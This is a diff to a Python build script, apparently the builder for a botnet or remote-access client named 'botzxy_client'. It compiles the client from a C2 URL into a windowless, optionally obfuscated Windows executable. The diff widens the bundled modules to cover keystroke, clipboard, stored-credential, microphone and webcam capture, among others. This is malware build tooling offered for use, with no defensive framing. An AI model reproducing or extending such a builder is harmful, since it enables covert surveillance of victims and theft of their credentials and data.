@@ -119,12 +119,17 @@ def build_windows(c2_url, obfuscate=True):
         f.write(content)
     
     print_info("Compilazione in corso...")
+    hidden = ['keyboard', 'pyautogui', 'win32clipboard', 'win32api', 'win32con',
+              'win32process', 'win32cred', 'win32crypt', 'win32com', 'win32com.client',
+              'psutil', 'pyaudio', 'cryptography', 'pyttsx3', 'sqlite3', 'cv2',
+              'numpy', 'PIL', 'requests', 'ctypes']
     cmd = [
         sys.executable, '-m', 'PyInstaller',
         '--onefile', '--noconsole', '--name', 'botzxy_client',
-        '--hidden-import', 'keyboard', '--hidden-import', 'pyautogui',
-        '--hidden-import', 'win32clipboard', temp_path
     ]
+    for h in hidden:
+        cmd += ['--hidden-import', h]
+    cmd.append(temp_path)
     
     result = subprocess.run(cmd, capture_output=True)
     os.remove(temp_path)
